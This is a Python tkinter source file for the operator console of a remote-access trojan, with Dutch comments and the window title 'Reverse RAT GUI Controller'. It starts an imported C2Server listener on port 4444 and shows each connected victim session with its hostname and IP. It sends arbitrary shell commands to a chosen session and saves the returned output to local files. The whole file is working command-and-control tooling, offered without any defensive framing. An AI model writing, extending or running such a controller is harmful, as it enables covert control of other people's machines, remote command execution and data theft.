import base64
import threading
import tkinter as tk

from server import C2Server


class RemoteAdminGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Reverse RAT GUI Controller")

        self.server = None
        self.running = False
        # Interne mapping van Listbox rij-index naar het daadwerkelijke Session object
        self.displayed_sessions = []

        # --- controls ---
        self.host_var = tk.StringVar(value="0.0.0.0")
        self.port_var = tk.StringVar(value="4444")
        self.token_var = tk.StringVar(value="change-me")

        tk.Label(root, text="Host:").grid(row=0, column=0, sticky="e")
        tk.Entry(root, textvariable=self.host_var).grid(row=0, column=1, sticky="we")

        tk.Label(root, text="Port:").grid(row=1, column=0, sticky="e")
        tk.Entry(root, textvariable=self.port_var).grid(row=1, column=1, sticky="we")

        tk.Label(root, text="Token:").grid(row=2, column=0, sticky="e")
        tk.Entry(root, textvariable=self.token_var).grid(row=2, column=1, sticky="we")

        self.start_server_button = tk.Button(root, text="Start Server", command=self.start_server)
        self.start_server_button.grid(row=3, column=0, columnspan=2, sticky="we", pady=4)

        # --- session list ---
        tk.Label(root, text="Active Sessions:").grid(
            row=4, column=0, columnspan=2, sticky="w"
        )
        self.session_list = tk.Listbox(root, height=6)
        self.session_list.grid(row=5, column=0, columnspan=2, sticky="nsew", padx=4, pady=4)

        # --- command area ---
        self.command_entry = tk.Entry(root)
        self.command_entry.grid(row=6, column=0, columnspan=2, sticky="we", padx=4, pady=2)
        self.command_entry.bind("<Return>", lambda e: self.send_command())

        self.send_command_button = tk.Button(root, text="Send Command", command=self.send_command)
        self.send_command_button.grid(row=7, column=0, columnspan=2, sticky="we", pady=2)

        # --- log/output ---
        self.output = tk.Text(root, height=12)
        self.output.grid(row=8, column=0, columnspan=2, sticky="nsew", padx=4, pady=4)

        root.columnconfigure(1, weight=1)
        root.rowconfigure(8, weight=1)

    def log(self, msg):
        # Thread-safe logging naar de Tkinter Text widget
        def _append():
            self.output.insert(tk.END, str(msg) + "\n")
            self.output.see(tk.END)
        self.root.after(0, _append)

    def start_server(self):
        if self.server:
            return

        host = self.host_var.get()
        port = int(self.port_var.get())
        token = self.token_var.get()

        self.server = C2Server(host, port, token, log=self.log)
        self.server.start()
        self.running = True
        self.schedule_session_updates()

    def schedule_session_updates(self):
        """Periodiek de sessielijst verversen (elke 2 seconden)."""
        if self.running:
            self.update_sessions()
            self.root.after(2000, self.schedule_session_updates)

    def update_sessions(self):
        if not self.running or not self.server:
            return

        # Onthoud welk session_id momenteel geselecteerd is
        selected_session_id = None
        current_session = self.selected_session()
        if current_session:
            selected_session_id = current_session.id

        self.session_list.delete(0, tk.END)
        self.displayed_sessions.clear()

        # Filter actieve sessies en bouw een schone mapping op
        for session in self.server.sessions:
            if session.alive:
                hostname = session.info.get('hostname') or "Unknown"
                addr = session.addr[0] if session.addr else "N/A"
                
                # Voeg toe aan Listbox en bewaar de referentie in ons mapping-array
                self.session_list.insert(tk.END, f"Session {session.id}: {hostname} ({addr})")
                self.displayed_sessions.append(session)

                # Herstel de selectie als dit het eerder geselecteerde ID was
                if selected_session_id is not None and session.id == selected_session_id:
                    new_idx = len(self.displayed_sessions) - 1
                    self.session_list.selection_set(new_idx)
                    self.session_list.activate(new_idx)

    def selected_session(self):
        if not self.server:
            return None
        sel = self.session_list.curselection()
        if not sel:
            return None
        idx = int(sel[0])
        
        # Gebruik de interne displayed_sessions mapping i.p.v. raw server.sessions index
        if idx >= len(self.displayed_sessions):
            return None
        session = self.displayed_sessions[idx]
        if not session.alive:
            return None
        return session

    def send_command(self, command=None):
        session = self.selected_session()
        if not session:
            self.log("[-] No active session selected")
            return

        cmd = self.command_entry.get().strip()
        if not cmd:
            return

        self.command_entry.delete(0, tk.END)

        def worker():
            try:
                resp = session.command({"type": "exec", "cmd": cmd})
                if resp and "data" in resp:
                    data = base64.b64decode(resp["data"])
                    local_file_path = f"session_{session.id}_{cmd}.bin"
                    with open(local_file_path, "wb") as file:
                        file.write(data)
                    self.log(f"[+] Output saved to {local_file_path}")
                else:
                    self.log(f"[-] No valid response received from session {session.id}")
            except Exception as e:
                self.log(f"[ERROR] {e}")

        threading.Thread(target=worker, daemon=True).start()


if __name__ == "__main__":
    root = tk.Tk()
    app = RemoteAdminGUI(root)
    root.mainloop()
